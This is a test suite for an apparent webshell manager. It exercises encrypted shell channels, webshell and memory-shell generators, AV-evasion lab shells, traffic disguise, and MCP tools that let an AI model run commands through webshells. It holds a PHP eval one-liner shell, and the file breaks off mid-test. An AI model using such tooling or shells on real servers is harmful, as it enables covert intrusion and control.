// dsh-webshell-mgr 测试套件：
//   1) 离线单测：命令翻译（引号/解析）、AES 信封自洽、store CRUD、插件清单校验、
//      生成器产物、extractMarked
//   2) MCP 握手：spawn mcp/server.mjs 走 initialize/tools/list JSON-RPC
//   3) PHP 回路烟测（本机有 php 时执行）：生成器产出三类马 + av-lab 两匹魔改马挂
//      php -S 回路 detect→exec→文件→数据库→插件全链路
// 运行：node test/run.mjs

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, mkdirSync, existsSync, rmSync, readFileSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createCipheriv, createDecipheriv } from "node:crypto";
import http from "node:http";

const PKG = dirname(dirname(fileURLToPath(import.meta.url)));

const results = { pass: 0, fail: 0, skip: 0 };
async function ok(name, fn) {
	try { await fn(); results.pass++; console.log(`  ok   ${name}`); }
	catch (e) { results.fail++; console.log(`  FAIL ${name}\n       ${e?.stack ?? e}`); }
}
function skip(name, why) { results.skip++; console.log(`  skip ${name}（${why}）`); }

function phpAvailable() {
	try { execFileSync("php", ["-v"], { stdio: "ignore" }); return true; } catch { return false; }
}

//#region 1. 命令翻译层

import * as cb from "../lib/protocol/command-build.js";
const { connectSpec } = await import("../lib/index.js");

await ok("connectSpec：模型工具 snake_case 参数映射到内部 camelCase", () => {
	const spec = connectSpec({ url: "http://127.0.0.1/x.php", pass_param: "x", cmd_param: "do", secret_key: "salt" });
	if (spec.passParam !== "x" || spec.cmdParam !== "do" || spec.secretKey !== "salt") throw new Error(JSON.stringify(spec));
});

await ok("quotePosix 单引号转义", () => {
	if (cb.quotePosix("it's") !== "'it'\\''s'") throw new Error(cb.quotePosix("it's"));
	if (cb.quotePosix("a b") !== "'a b'") throw new Error("plain");
});

await ok("quoteCmd / quotePs 转义", () => {
	if (cb.quoteCmd('a"b') !== '"a""b"') throw new Error("cmd");
	if (cb.quotePs("c:\\x'y") !== "'c:\\x''y'") throw new Error("ps");
});

await ok("parseOsProbe：Windows_NT / 字面量", () => {
	if (cb.parseOsProbe(":WSMPROBE-Windows_NT-END:") !== "windows") throw new Error("win");
	if (cb.parseOsProbe(":WSMPROBE-%OS%-END:\n") !== "linux") throw new Error("linux");
	if (cb.parseOsProbe("nothing") !== null) throw new Error("null");
});

await ok("parseLs：long-iso 与月份双格式", () => {
	const rows = cb.parseLs([
		"total 8",
		"drwxr-xr-x  2 www www 4096 2026-08-21 10:22 dir1",
		"-rw-r--r--  1 u   g     12 Aug 21 10:22 file with space.txt"
	].join("\n"));
	if (rows.length !== 2) throw new Error(`rows=${rows.length}`);
	if (rows[0].name !== "dir1" || !rows[0].isDir) throw new Error("dir1");
	if (rows[1].name !== "file with space.txt" || rows[1].size !== 12) throw new Error("file");
});

await ok("parseDir：windows 目录/文件/表头跳过", () => {
	const rows = cb.parseDir([
		" Volume in drive C has no label.",
		" Directory of C:\\www",
		"08/21/2026  10:22 AM    <DIR>          .",
		"08/21/2026  10:22 AM    <DIR>          ..",
		"08/21/2026  10:23 AM    <DIR>          sub",
		"08/21/2026  10:24 AM            12,345 data.bin",
		"               1 File(s)         12,345 bytes"
	].join("\r\n"));
	if (rows.length !== 2) throw new Error(`rows=${rows.length}`);
	if (rows[0].name !== "sub" || !rows[0].isDir) throw new Error("sub");
	if (rows[1].name !== "data.bin" || rows[1].size !== 12345) throw new Error("bin");
});

await ok("parseDir：zh-CN Windows 24 小时时间格式", () => {
	const rows = cb.parseDir([
		" 驱动器 C 中的卷是 Windows",
		" C:\\Temp\\wsm 的目录",
		"",
		"2026/09/19  05:42    <DIR>          .",
		"2026/09/19  05:42             4,000 chunk.bin",
		"               1 个文件          4,000 字节"
	].join("\r\n"));
	if (rows.length !== 1 || rows[0].name !== "chunk.bin" || rows[0].size !== 4000) throw new Error(JSON.stringify(rows));
});

await ok("cleanB64Output：certutil 头尾剥离", () => {
	const out = cb.cleanB64Output("-----BEGIN CERTIFICATE-----\nQUJD\nRVBG==\n-----END CERTIFICATE-----\nCertUtil: -encode command completed successfully.");
	if (out !== "QUJDRVBG==") throw new Error(out);
});

await ok("cleanB64Output：certutil 中文状态行数字不得污染 base64", () => {
	const out = cb.cleanB64Output("输入长度 = 20\n输出字节 = 86\nCertUtil: -encode 命令成功完成。\n-----BEGIN CERTIFICATE-----\nQUFBQUFBQUFBQUFBQUFBQUFBQUE=\n-----END CERTIFICATE-----\n");
	if (out !== "QUFBQUFBQUFBQUFBQUFBQUFBQUE=") throw new Error(out);
});

await ok("buildFileCommand：动作映射", () => {
	if (!cb.buildFileCommand("ls", { path: "/t" }, "linux").includes("ls -la")) throw new Error("ls");
	if (!cb.buildFileCommand("read", { path: "C:/t" }, "windows").includes("certutil")) throw new Error("read-win");
	if (!cb.buildFileCommand("write-first", { path: "/t", b64: "QUJD" }, "linux").includes("base64 -d >")) throw new Error("write");
});

await ok("buildFileCommand：Windows cmd 分块低于 8191 命令行上限", () => {
	const b64 = Buffer.alloc(cb.WINDOWS_CMD_SAFE_CHUNK_RAW, 0x41).toString("base64");
	const cmd = cb.buildFileCommand("write-first", { path: "C:\\Windows\\Temp\\wsm.bin", b64 }, "windows");
	if (cmd.length >= 8191) throw new Error(`command length=${cmd.length}`);
});

//#endregion

//#region 2. AES 信封自洽（Node 双端模拟 PHP openssl 语义）

await ok("dsh-aes 信封：加解密往返 + PKCS7 与 openssl 语义一致", async () => {
	const { sendOp } = await import("../lib/protocol/dsh-aes.js");
	// 模拟马侧：截获 X-T 与 body，用标准 AES-128-CBC + PKCS7 解密（= PHP openssl RAW_DATA 语义）
	let captured = null;
	const srv = http.createServer((req, res) => {
		const chunks = [];
		req.on("data", (c) => chunks.push(c));
		req.on("end", () => {
			const xt = Buffer.from(req.headers["x-t"], "base64");
			const iv = xt.subarray(0, 16), key = xt.subarray(16);
			const ct = Buffer.from(Buffer.concat(chunks).toString("utf8"), "base64");
			const dec = createDecipheriv("aes-128-cbc", key, iv);
			const pt = Buffer.concat([dec.update(ct), dec.final()]).toString("utf8");
			captured = pt;
			const out = pt === "c" + "echo HELLO" ? "HELLO" : "";
			res.setHeader("content-type", "application/json");
			res.end(JSON.stringify({ code: 0, data: Buffer.from(out).toString("base64") }));
		});
	});
	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
	const port = srv.address().port;
	const out = await sendOp({ url: `http://127.0.0.1:${port}/x.php`, timeoutMs: 3000 }, "c" + "echo HELLO");
	if (captured !== "cecho HELLO") throw new Error(`captured=${captured}`);
	if (out.toString("utf8") !== "HELLO") throw new Error(`out=${out}`);
	srv.close();
});

//#endregion

//#region 2b. Java 载荷管线（behinder-java：常量池补丁 + 线协议自洽）

import { patchClass, readFieldValues, classNameOf } from "../lib/protocol/javapatch.js";
import { JAVA_PAYLOADS } from "../lib/protocol/payloads-java.js";
import { decodeSeg } from "../lib/protocol/dsh-mem.js";
import { runCommand as capRunCommand } from "../lib/protocol/capabilities.js";
import { parseJsonResponse } from "../lib/protocol/json-response.js";

await ok("javapatch：五载荷嵌入 + 补丁/改名往返 + 未知字段报错", () => {
	for (const name of ["WsmProbe", "WsmCmd", "WsmList", "WsmRead", "WsmWrite"]) {
		if (!JAVA_PAYLOADS[name]) throw new Error(`缺载荷 ${name}`);
		const orig = Buffer.from(JAVA_PAYLOADS[name], "base64");
		const vals = readFieldValues(orig);
		if (!Object.keys(vals).length) throw new Error(`${name} 无 ConstantValue 字段`);
		const patched = patchClass(orig, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "V-" + k])), "x/Rnd" + name);
		if (classNameOf(patched) !== "x/Rnd" + name) throw new Error(`${name} 类名未改`);
		for (const [k] of Object.entries(vals)) {
			if (readFieldValues(patched)[k] !== "V-" + k) throw new Error(`${name}.${k} 补丁未生效`);
		}
	}
	let threw = false;
	try { patchClass(Buffer.from(JAVA_PAYLOADS.WsmCmd, "base64"), { nope: "x" }); } catch { threw = true; }
	if (!threw) throw new Error("未知字段应报错");
});

await ok("behinder-java 线协议：加密信封经模拟马侧解出已补丁 class", async () => {
	const { sendJavaPayload } = await import("../lib/protocol/behinder-java.js");
	const { md5hex, b64 } = await import("../lib/protocol/http-client.js");
	const password = "wiretest1";
	let verdict = null;
	const srv = http.createServer((req, res) => {
		const chunks = [];
		req.on("data", (c) => chunks.push(c));
		req.on("end", () => {
			if (req.method !== "POST" || req.headers["x-t"] !== "1") { res.statusCode = 400; res.end(); return; }
			// 模拟冰蝎型 JSP 马侧：b64 → AES-ECB 解密 → 得 class 字节 → 解析字段回显
			const key = Buffer.from(md5hex(password).slice(0, 16));
			const d = createDecipheriv("aes-128-ecb", key, null);
			const cls = Buffer.concat([d.update(Buffer.from(Buffer.concat(chunks).toString("utf8"), "base64")), d.final()]);
			verdict = { class: classNameOf(cls), fields: readFieldValues(cls) };
			res.setHeader("content-type", "text/plain");
			res.end("WSM1|TOKEN|Mac_OS_X|u|h|d|1.8.0|8|/webroot");
		});
	});
	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
	const out = await sendJavaPayload({ url: `http://127.0.0.1:${srv.address().port}/shell.jsp`, password, timeoutMs: 3000 }, "WsmProbe", { t: "TOKEN" });
	if (!out.startsWith("WSM1|TOKEN")) throw new Error(`out=${out}`);
	if (!verdict.class.startsWith("x/")) throw new Error(`类名未随机化：${verdict.class}`);
	if (verdict.fields.t !== "TOKEN") throw new Error(`字段补丁未达马侧：${JSON.stringify(verdict.fields)}`);
	srv.close();
});

await ok("生成器：jsp-behinder 密钥派生 + jsp-mem-filter 注入特征", async () => {
	const { generate } = await import("../lib/generators.js");
	const { createHash } = await import("node:crypto");
	const pass = "genpass1";
	const key = createHash("md5").update(pass).digest("hex").slice(0, 16);
	const b = generate("jsp-behinder", { password: pass });
	if (!b.content.includes(`"${key}"`)) throw new Error("冰蝎型 JSP 未嵌 md5 派生 key");
	if (!b.content.includes("defineClass") || !b.content.includes("equals(pageContext)")) throw new Error("defineClass 契约缺失");
	const m = generate("jsp-mem-filter", { password: pass });
	for (const feat of ["X-T", "MEMSHELL-OK", "getDeclaredField(\"context\")", "addURLPattern", key]) {
		if (!m.content.includes(feat)) throw new Error(`内存马引导器缺特征 ${feat}`);
	}
});

await ok("dsh-mem 回显段解码：b64 段解码 + 原文段直通", () => {
	if (decodeSeg(Buffer.from("whoami-out").toString("base64")) !== "whoami-out") throw new Error("b64 段");
	if (decodeSeg("sh: command not found") !== "sh: command not found") throw new Error("原文段");
	if (decodeSeg("") !== "") throw new Error("空段");
});

await ok("capabilities：dsh-mem 命令执行接到真实通道", async () => {
	let sentCommand = "";
	const srv = http.createServer((req, res) => {
		sentCommand = String(req.headers["x-c"] ?? "");
		res.setHeader("content-type", "text/plain");
		res.end(Buffer.from("memory-ok").toString("base64"));
	});
	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
	const out = await capRunCommand({ protocol: "dsh-mem", url: `http://127.0.0.1:${srv.address().port}/x`, timeoutMs: 3000 }, "whoami");
	srv.close();
	if (sentCommand !== "whoami" || out !== "memory-ok") throw new Error(`sent=${sentCommand} out=${out}`);
});

//#endregion

//#region 2c. 编译载荷通道向量（godzilla-java 序列化 / 新载荷嵌入 / 生成器特征）

import { serializeParams, parseParams } from "../lib/protocol/godzilla-java.js";
import { ASPX_PAYLOADS } from "../lib/protocol/payloads-aspx.js";

await ok("godzilla-java：Parameter 序列化往返 + 二进制值", () => {
	const obj = { methodName: "cmd", c: "whoami; echo '它'", d: "", bin: Buffer.from([0, 1, 2, 0xff, 0x02]) };
	const buf = serializeParams(obj);
	const back = parseParams(buf);
	if (back.methodName.toString("utf8") !== "cmd") throw new Error("methodName");
	if (back.c.toString("utf8") !== "whoami; echo '它'") throw new Error("中文值");
	if (!back.bin.equals(obj.bin)) throw new Error("二进制值（含 0x02 分隔符字节）");
});

await ok("载荷族嵌入：WsmG/WsmDb/WsmMemUnload/U 均在", () => {
	for (const n of ["WsmG", "WsmDb", "WsmMemUnload"]) {
		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
		if (raw.length < 500) throw new Error(`${n} 过小`);
		readFieldValues(raw); // 可解析
	}
	if (!ASPX_PAYLOADS.U || Buffer.from(ASPX_PAYLOADS.U, "base64").length < 3000) throw new Error("U.dll 缺失");
});

await ok("生成器编译载荷特征：jsp-godzilla 标记 + aspx-behinder 契约", async () => {
	const { generate } = await import("../lib/generators.js");
	const { createHash } = await import("node:crypto");
	const md5 = (x) => createHash("md5").update(x).digest("hex");
	const g = generate("jsp-godzilla", { password: "pass", secretKey: "sk" });
	const key = md5("sk").slice(0, 16);
	// md5 标记是马侧运行时算的——产物只需含 m5 调用 + 密钥组件
	if (!g.content.includes('m5("pass" + "' + key + '")')) throw new Error("md5 标记计算缺失");
	if (!g.content.includes(key)) throw new Error("xc 密钥缺失");
	if (!g.content.includes("parameters")) throw new Error("parameters 契约缺失");
	const a = generate("aspx-behinder", { password: "p1" });
	for (const f of ['CreateInstance("U")', "BinaryRead", "ECB", md5("p1").slice(0, 16)]) {
		if (!a.content.includes(f)) throw new Error(`aspx 缺特征 ${f}`);
	}
});

//#endregion

//#region 2d. 流量伪装与网络载荷向量（profile 整形 / 网络载荷嵌入）

import { shapeHeaders, stripResponse, validateProfile } from "../lib/protocol/profile.js";

await ok("profile：UA 轮换 + 显式头优先 + 剖离 + 校验", () => {
	const conn = { id: "tp", profile_json: '{"uas":["A1","A2"],"headers":{"X-T2":"v"},"strip":["<<",">>"]}' };
	const h1 = shapeHeaders(conn, { "content-type": "text/plain" });
	const h2 = shapeHeaders(conn, { "content-type": "text/plain" });
	if (h1["User-Agent"] !== "A1" || h2["User-Agent"] !== "A2") throw new Error("UA 轮换");
	if (h1["User-Agent"] !== "A1") throw new Error("首轮 UA");
	const h3 = shapeHeaders(conn, { "User-Agent": "explicit" });
	if (h3["User-Agent"] !== "explicit") throw new Error("显式优先");
	if (h1["X-T2"] !== "v" || h1["content-type"] !== "text/plain") throw new Error("附加头/保留原头");
	if (stripResponse(conn, "<<data>>") !== "data") throw new Error("剖离");
	if (stripResponse({ id: "x" }, "raw") !== "raw") throw new Error("无 profile 直通");
	if (!validateProfile(conn.profile_json).ok) throw new Error("合法 profile 被拒");
	if (validateProfile("bad{").ok) throw new Error("非法 profile 放行");
});

await ok("网络载荷族嵌入：Socks/Fwd/Reverse/Zip/EnumDb/Shot 单类可补丁", () => {
	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse", "WsmZip", "WsmEnumDb", "WsmShot"]) {
		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
		const vals = readFieldValues(raw);
		patchClass(raw, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "v"])), "x/N" + n);
	}
	// lambda 载荷无内部类（编译期单文件交付的前提）
	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse"]) {
		if (!JAVA_PAYLOADS["Wsm" + n.slice(3)]) throw new Error(`${n} 缺失`);
	}
});

//#endregion

//#region 3. snippets

import * as sn from "../lib/protocol/snippets.js";

await ok("extractMarked：WSMJSON / WSMB64 / 原文", () => {
	const j = sn.extractMarked('noise{"ok":true}WSMJSON{"a":1}');
	if (j.a !== 1) throw new Error("json");
	const b = sn.extractMarked("WSMB64QUJD");
	if (b.b64buffer !== "QUJD") throw new Error("b64");
	const t = sn.extractMarked("plain");
	if (t.text !== "plain") throw new Error("text");
});

await ok("phpLs 片段：参数 base64 内嵌", () => {
	const code = sn.phpLs("/var/tmp/x'y");
	if (!code.includes("base64_decode('")) throw new Error("b64 embed");
	if (code.includes("/var/tmp/x'y")) throw new Error("原文泄漏进片段（转义缺失）");
});

//#endregion

//#region 4. store

import { openStore, saveConn, listConns, getConn, deleteConn, saveDbProfile, listDbProfiles, logOp, listOps, recordGeneration, listGenerations } from "../lib/store.js";

await ok("store：连接 CRUD + 档案 + op_log", () => {
	const st = openStore(":memory:");
	const c = saveConn(st, { name: "t1", url: "http://a/b.php", protocol: "dsh-aes" });
	if (!getConn(st, c.id)) throw new Error("get");
	if (listConns(st).length !== 1) throw new Error("list");
	saveConn(st, { id: c.id, name: "t2" });
	if (getConn(st, c.id).name !== "t2") throw new Error("update 沿用未提交字段");
	const p = saveDbProfile(st, c.id, { type: "sqlite", database: "/tmp/x.db" });
	if (listDbProfiles(st, c.id).length !== 1 || !p.id) throw new Error("profile");
	logOp(st, c.id, "exec", "id");
	if (listOps(st, c.id).length !== 1) throw new Error("op");
	deleteConn(st, c.id);
	if (listConns(st).length !== 0 || listDbProfiles(st, c.id).length !== 0) throw new Error("cascade delete");
});

await ok("生成器：delete 产物使用真实 store，不抛未定义变量", () => {
	const st = openStore(":memory:");
	const rec = recordGeneration(st, { name: "probe", lang: "php", kind: "basic", filePath: "/tmp/probe.php", meta: {} });
	const r = genCore("delete", { id: rec.id }, st);
	if (!r.ok || listGenerations(st).length !== 0) throw new Error(JSON.stringify({ r, left: listGenerations(st).length }));
	st.close();
});

await ok("settings：宿主 schema 注册成功（非降级）", () => {
	const r = spawnSync(process.execPath, ["--import", "../../scripts/test-stub-register.mjs", "test/_settings-probe.mjs"], {
		cwd: join(dirname(fileURLToPath(import.meta.url)), ".."), encoding: "utf8",
	});
	if (r.status !== 0 || !r.stdout.includes("ok settings schema")) throw new Error(`${r.stdout}\n${r.stderr}`);
});

// 库损坏自愈（2026-09-13 夜：与另外 5 个插件同类的孪生 bug）────────────────
// 背景：`new DatabaseSync` 遇到坏文件直接抛 `file is not a database`，
// 而本插件的**全部功能**（自有马库 / 已登记连接 / 操作日志）都挂在这个库上 —— 一抛全废。
{
	const dir = mkdtempSync(join(tmpdir(), "wsm-heal-"));
	const dbPath = join(dir, "webshell.db");

	await ok("坏库（垃圾字节）不抛异常，且功能可用", () => {
		writeFileSync(dbPath, Buffer.from([0x00, 0x01, 0x02, 0xff, 0xfe, 0x7f, 0x00, 0x42]));
		const st = openStore(dbPath);                  // 修复前：这里抛 file is not a database
		const c = saveConn(st, { name: "heal-t", url: "http://a/b.php", protocol: "dsh-aes" });
		if (!getConn(st, c.id)) throw new Error("自愈后应能正常读写");
		st.close();
	});

	await ok("坏库被改名备份（原文件不丢，可人工找回）", () => {
		const backups = readdirSync(dir).filter((f) => f.includes(".corrupt-"));
		if (backups.length !== 1) throw new Error(`应恰好有 1 个备份，实际 ${backups.length}`);
	});

	await ok("备份内容就是原始垃圾字节（没被覆盖或清空）", () => {
		const bak = readdirSync(dir).find((f) => f.includes(".corrupt-"));
		const bytes = readFileSync(join(dir, bak));
		if (bytes.length !== 8) throw new Error("备份应与原文件等长，实际 " + bytes.length);
		if (bytes[3] !== 0xff) throw new Error("字节内容应原样保留，实际 " + bytes[3]);
	});

	await ok("正常库不会被误判为坏库（幂等）", () => {
		const st = openStore(dbPath);                  // 第二次打开：库头已是 SQLite
		if (listConns(st).length !== 1) throw new Error("原数据应还在");
		st.close();
		const backups = readdirSync(dir).filter((f) => f.includes(".corrupt-"));
		if (backups.length !== 1) throw new Error("不应新增备份，实际 " + backups.length);
	});

	await ok(":memory: 不走自愈路径（不报错）", () => {
		const st = openStore(":memory:");
		if (listConns(st).length !== 0) throw new Error("应空库");
		st.close();
	});

	rmSync(dir, { recursive: true, force: true });
}

//#endregion

//#region 4b. 库列举同源（界面侧 self-list == 模型侧 webshell_library_list）

// 回归锁：曾出现「目录里 17 个马，模型 webshell_library_list 报自有马 0 个」——
// 模型工具只读已登记元数据，而界面走目录扫描，两者不同源。这里锁定：目录里的
// 马（含从未在设置页登记过的）必须对模型可见，且噪音文件不进库。
import { listLibraryShells, findLibraryShell, genCore } from "../lib/index.js";

await ok("库列举同源：目录里的马对模型可见（含未登记）+ 噪音过滤 + 语言归类", () => {
	const dir = mkdtempSync(join(tmpdir(), "wsm-lib-"));
	writeFileSync(join(dir, "php_eval.php"), "<?php @eval($_POST['x']);?>");
	writeFileSync(join(dir, "jsp_cmd.jsp"), "<% out.print(1); %>");
	writeFileSync(join(dir, "aspx_antsword.aspx"), "<%@ Page %>");
	writeFileSync(join(dir, "readme.md"), "# 说明");
	writeFileSync(join(dir, "notes.md"), "随手记");
	writeFileSync(join(dir, "nmap.exe"), "MZ");
	writeFileSync(join(dir, "half.php.part"), "partial");
	const lib = listLibraryShells(dir);
	const files = lib.shells.map((s) => s.file).sort();
	const expect = ["aspx_antsword.aspx", "jsp_cmd.jsp", "php_eval.php"];
	if (files.join(",") !== expect.join(",")) throw new Error(`库内条目=${files.join(",")} 期望=${expect.join(",")}`);
	if (lib.dir !== dir) throw new Error("dir 未被 override 尊重：" + lib.dir);
	if (!lib.shells.every((s) => s.registered === false)) throw new Error("目录条目应为未登记");
	if (!lib.shells.every((s) => s.obf === "（未登记）")) throw new Error("未登记条目绕过形式应标注");
	const byFile = Object.fromEntries(lib.shells.map((s) => [s.file, s.lang]));
	if (byFile["php_eval.php"] !== "PHP" || byFile["jsp_cmd.jsp"] !== "JSP" || byFile["aspx_antsword.aspx"] !== "ASPX") {
		throw new Error("语言归类错误：" + JSON.stringify(byFile));
	}
	// 按 name / file 两种键都要能定位（模型只会拿到 name 或 file）
	if (findLibraryShell("jsp_cmd", dir)?.file !== "jsp_cmd.jsp") throw new Error("按 name 定位失败");
	if (findLibraryShell("jsp_cmd.jsp", dir)?.file !== "jsp_cmd.jsp") throw new Error("按 file 定位失败");
	if (findLibraryShell("readme", dir) !== null) throw new Error("噪音文件不应能被读取");
});

//#endregion

//#region 5. 生成器

import { GEN_KINDS, makeAndSave, generate } from "../lib/generators.js";

await ok("生成器：8 类产物非空且特征正确", () => {
	const tmp = mkdtempSync(join(tmpdir(), "wsm-gen-"));
	for (const kind of Object.keys(GEN_KINDS)) {
		const item = makeAndSave(tmp, kind, { password: "pw123", name: "t-" + kind });
		if (!item.content || item.content.length < 30) throw new Error(`${kind} 内容异常`);
		if (!existsSync(item.filePath)) throw new Error(`${kind} 未落盘`);
	}
	const aes2 = generate("php-aes2", {});
	if (!aes2.content.includes("case 'e'")) throw new Error("v2 缺 e 操作码");
	const aes1 = generate("php-aes1", {});
	if (aes1.content.includes("case 'e'")) throw new Error("v1 不应含 e");
	const one = generate("php-oneliner", { passParam: "zz" });
	if (!one.content.includes("$_POST['zz']")) throw new Error("oneliner 参数名");
	rmSync(tmp, { recursive: true, force: true });
});

//#endregion

//#region 6. 插件注册表

import { listPlugins, renderPayload, getPlugin } from "../lib/plugins-registry.js";
import { isTrustedRequest, checkCsrf } from "../lib/index.js";

await ok("插件注册表：示例发现 + 清单校验 + 占位渲染", () => {
	const plugins = listPlugins(join(tmpdir(), "wsm-none"));
	const names = plugins.map((p) => p.name);
	if (!names.includes("sysinfo") || !names.includes("portscan")) throw new Error(`示例缺失：${names}`);
	const ps = getPlugin(join(tmpdir(), "wsm-none"), "portscan");
	if (!ps.params.some((p) => p.key === "host")) throw new Error("参数表");
	const code = renderPayload(ps, { host: "127.0.0.1", ports: "80", timeout: "1" });
	const hostB64 = Buffer.from("127.0.0.1").toString("base64");
	if (!code.includes("base64_decode('" + hostB64 + "')")) throw new Error("host 未按 b64 形态渲染");
	if (/\{\{/.test(code)) throw new Error("占位符残留");
});

//#endregion

//#region 7. MCP 握手

await ok("MCP server：initialize + tools/list 八件工具", async () => {
	const home = mkdtempSync(join(tmpdir(), "wsm-mcp-"));
	const child = spawn(process.execPath, [join(PKG, "mcp", "server.mjs")], {
		env: { ...process.env, HOME: home }, stdio: ["pipe", "pipe", "pipe"]
	});
	let buf = "";
	const pending = [];
	child.stdout.on("data", (d) => {
		buf += d.toString("utf8");
		let i;
		while ((i = buf.indexOf("\n")) >= 0) {
			const line = buf.slice(0, i); buf = buf.slice(i + 1);
			if (!line.trim()) continue;
			try { pending.shift()?.(JSON.parse(line)); } catch { /* 非 JSON 行忽略 */ }
		}
	});
	const send = (obj) => new Promise((resolve) => { pending.push(resolve); child.stdin.write(JSON.stringify(obj) + "\n"); });
	const init = await send({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } });
	if (init.result?.serverInfo?.name !== "dsh-webshell-mgr") throw new Error("init");
	const list = await send({ jsonrpc: "2.0", id: 2, method: "tools/list" });
	const toolNames = list.result.tools.map((t) => t.name);
	for (const expect of ["webshell_connect", "webshell_exec", "webshell_file", "webshell_db", "webshell_plugin_list", "webshell_plugin_run", "webshell_generate", "webshell_list"]) {
		if (!toolNames.includes(expect)) throw new Error(`缺工具 ${expect}`);
	}
	child.kill();
	rmSync(home, { recursive: true, force: true });
});

//#endregion

//#region 8. PHP 回路烟测

if (phpAvailable()) {
	const tmp = mkdtempSync(join(tmpdir(), "wsm-php-"));
	mkdirSync(join(tmp, "shells"));

	// 现场产出三类自研马（写入被服务目录）
	const shells = join(tmp, "shells");
	writeFileSync(join(shells, "one.php"), generate("php-oneliner", { passParam: "x" }).content);
	writeFileSync(join(shells, "basic.php"), generate("php-basic", { passParam: "gate", cmdParam: "do", password: "pw-basic" }).content);
	writeFileSync(join(shells, "aes2.php"), generate("php-aes2", {}).content);
	writeFileSync(join(shells, "beh.php"), generate("php-behinder", { password: "pw-beh" }).content);
	writeFileSync(join(shells, "god.php"), generate("php-godzilla", { passParam: "gk", secretKey: "sk-123" }).content);
	// av-lab 两匹魔改马（协议互通回路）
	const lab = join(PKG, "..", "..", "modes", "av-evasion", "lab", "10-webshell-managers");
	for (const [src, dst] of [[join(lab, "behinder", "modified-shell.php"), "bmod.php"], [join(lab, "godzilla", "php-payload-demo.php"), "gmod.php"]]) {
		if (existsSync(src)) writeFileSync(join(shells, dst), readFileSync(src));
	}
	// sqlite 测试库
	const { DatabaseSync } = await import("node:sqlite");
	const sdb = new DatabaseSync(join(tmp, "test.db"));
	sdb.exec("CREATE TABLE t(id INTEGER, name TEXT); INSERT INTO t VALUES (1,'alpha'),(2,'beta');");
	sdb.close();

	const php = spawn("php", ["-S", "127.0.0.1:0"], { cwd: shells, stdio: ["ignore", "ignore", "pipe"] });
	let phpPort = 0;
	await new Promise((resolve) => {
		php.stderr.on("data", (d) => {
			const m = /127\.0\.0\.1:(\d+)/.exec(String(d));
			if (m && !phpPort) { phpPort = Number(m[1]); resolve(); }
		});
		setTimeout(() => resolve(), 3000);
	});

	if (!phpPort) {
		skip("PHP 回路烟测", "php -S 未就绪");
	} else {
		const U = (p) => `http://127.0.0.1:${phpPort}/${p}`;
		const { detectProtocol } = await import("../lib/protocol/registry.js");
		const cap = await import("../lib/protocol/capabilities.js");
		const mkConn = (over) => Object.assign({ id: "t", method: "post", encoding: "auto", shell_lang: "php", pass_param: "x", cmd_param: "cmd", timeoutMs: 8000, headers: {} }, over);

		await ok("PHP 回路：一句话 eval 马——识别 + exec + 结构化 ls + 二进制读写", async () => {
			const r = await detectProtocol({ url: U("one.php"), password: "", passParam: "x" });
			if (!r.hit || r.protocol !== "cmd-eval") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("one.php"), protocol: "cmd-eval" });
			const out = await cap.runCommand(conn, "echo PHPALIVE");
			if (!out.includes("PHPALIVE")) throw new Error(String(out).slice(0, 200));
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "one.php")) throw new Error(JSON.stringify(entries).slice(0, 200));
			const bin = Buffer.from([0, 1, 2, 253, 254, 255, 10, 13, 0, 7]);
			await cap.writeFile(conn, join(tmp, "shells", "bin-eval.dat"), bin);
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-eval.dat"));
			if (!back.equals(bin)) throw new Error(`二进制往返不一致（${back.length} vs ${bin.length}）`);
		});

		await ok("PHP 回路：基础马（口令门+命令通道）——识别 + 命令翻译文件操作", async () => {
			const r = await detectProtocol({ url: U("basic.php"), password: "pw-basic", passParam: "gate", cmdParam: "do" });
			if (!r.hit || r.protocol !== "cmd-system") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("basic.php"), protocol: "cmd-system", password: "pw-basic", pass_param: "gate", cmd_param: "do" });
			const out = await cap.runCommand(conn, "echo BASICOK");
			if (!out.includes("BASICOK")) throw new Error(String(out).slice(0, 200));
			const bin = Buffer.alloc(30000);
			for (let i = 0; i < bin.length; i++) bin[i] = (i * 7 + 3) & 0xff;
			await cap.writeFile(conn, join(tmp, "shells", "bin-cmd.dat"), bin); // 走 base64 分块命令
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-cmd.dat"));
			if (!back.equals(bin)) throw new Error(`分块写读不一致（${back.length}）`);
			const entries = await cap.listDir(conn, join(tmp, "shells"));
			if (!entries.some((e) => e.name === "bin-cmd.dat")) throw new Error("ls 解析缺文件");
		});

		await ok("PHP 回路：自研加密马 v2——识别 + 原生 u/d 读写 + eval 片段", async () => {
			const r = await detectProtocol({ url: U("aes2.php"), password: "" });
			if (!r.hit || r.protocol !== "dsh-aes") throw new Error(JSON.stringify(r).slice(0, 400));
			const conn = mkConn({ url: U("aes2.php"), protocol: "dsh-aes" });
			const out = await cap.runCommand(conn, "echo AESOK");
			if (!out.includes("AESOK")) throw new Error(String(out).slice(0, 200));
			const bin = Buffer.from("binary-\x00\xff\x80-safe");
			await cap.writeFile(conn, join(tmp, "shells", "bin-aes.dat"), bin);
			const back = await cap.readFile(conn, join(tmp, "shells", "bin-aes.dat"));
			if (!back.equals(bin)) throw new Error("原生 u/d 读写不一致");
			const entries = await cap.listDir(conn, join(tmp, "shells")); // 经 e 操作码结构化
			if (!entries.some((e) => e.name === "bin-aes.dat")) throw new Error("eval ls 缺文件");
		});

		await ok("PHP 回路：冰蝎型形态马——识别 + 桥接 eval + 结构化 ls", async () => {
			const r = await detectProtocol({ url: U("beh.php"), password: "pw-beh" });
